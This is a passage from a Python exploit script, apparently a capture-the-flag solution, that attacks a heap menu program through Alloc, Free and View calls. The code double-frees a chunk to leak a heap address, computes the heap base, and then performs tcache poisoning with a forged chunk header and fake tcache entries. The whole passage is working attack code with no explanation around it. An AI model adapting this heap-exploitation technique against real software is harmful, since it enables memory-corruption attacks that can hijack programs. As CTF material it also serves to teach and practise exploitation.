...
#Alloc(0x420, b"A"*0x10)
# heap leak
Alloc(0x100, b"A"*0x10)
pause()
Free()
Free()
View()
heap_leak = u64(s.recvn(6)+b"\x00\x00")
heap_base = heap_leak - 0x670
print("heap_leak =", hex(heap_leak))
print("heap_base =", hex(heap_base))

# tcache poisoning
Alloc(0x100, p64(heap_base))
Alloc(0x100, b"D")
Alloc(0x100, p64(0)+p64(0x661)+p64(0x303030303030303)*8+p64(heap_base+0x10)+p64(heap_base+0x50))
Alloc(0x10, b"E")
